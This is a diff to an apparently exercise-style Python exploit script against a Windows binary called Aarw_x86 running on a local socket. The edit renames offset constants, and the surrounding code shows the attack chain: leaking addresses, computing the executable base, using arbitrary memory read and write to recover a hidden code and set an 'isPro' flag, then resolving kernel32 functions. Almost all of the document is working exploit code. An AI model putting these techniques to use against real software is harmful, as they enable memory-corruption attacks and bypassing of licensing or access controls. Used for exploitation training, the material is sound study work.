@@ -3,9 +3,9 @@ from environment import *
 
 s = Socket("127.0.0.1", 4444)
 
-HIDDEN_CODE_OFFSET = 0x22948  # ? Aarw_x86!hiddenCode - Aarw_x86
-IS_PRO_ADDRESS = 0x2294C  # ? Aarw_x86!isPro - Aarw_x86
-RET_OFFSET = 0x1482  # ? Aarw_x86!__scrt_common_main_seh+0xfd - Aarw_x86
+OFFSET_HIDDEN_CODE = 0x22948  # ? Aarw_x86!hiddenCode - Aarw_x86
+OFFSET_IS_PRO = 0x2294C  # ? Aarw_x86!isPro - Aarw_x86
+OFFSET_RET = 0x1482  # ? Aarw_x86!__scrt_common_main_seh+0xfd - Aarw_x86
 
 # pushed ebp address and value -> ? bp Aarw_x86!main; p 6; dd esp L1
 
@@ -98,18 +98,18 @@ def main():
     print(f"favorites base: 0x{favorites_address:x}")
 
     cmd()
-    exe_base_address = read_mem_by_offset(OFFSET_FAVORITES_TO_RET) - RET_OFFSET
+    exe_base_address = read_mem_by_offset(OFFSET_FAVORITES_TO_RET) - OFFSET_RET
     print(f"exe base: 0x{exe_base_address:x}")
 
     cmd()
-    hidden_code = read_mem(exe_base_address + HIDDEN_CODE_OFFSET, favorites_address)
+    hidden_code = read_mem(exe_base_address + OFFSET_HIDDEN_CODE, favorites_address)
     print(f"hiddenCode: 0x{hidden_code:x}")
 
     cmd()
     enter_hidden_mode(hidden_code)
 
     cmd()
-    write_mem(exe_base_address + IS_PRO_ADDRESS, 1, favorites_address)
+    write_mem(exe_base_address + OFFSET_IS_PRO, 1, favorites_address)
     print(cmd())
 
     kernel32_BaseThreadInitThunk_address = read_mem_by_offset(
